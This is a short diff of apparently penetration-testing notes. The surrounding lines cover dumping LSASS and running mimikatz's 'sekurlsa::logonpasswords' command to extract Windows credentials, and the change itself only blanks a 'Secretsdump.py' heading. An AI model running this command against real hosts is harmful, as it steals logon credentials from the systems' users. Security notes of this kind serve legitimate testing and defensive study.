@@ -10,7 +10,7 @@ Following extracting a dump of LSASS.exe from the target host, use mimikatz to e
 > sekurlsa::logonpasswords #extract credentials
 ```
 
-## Secretsdump.py
+## 
 
 
 
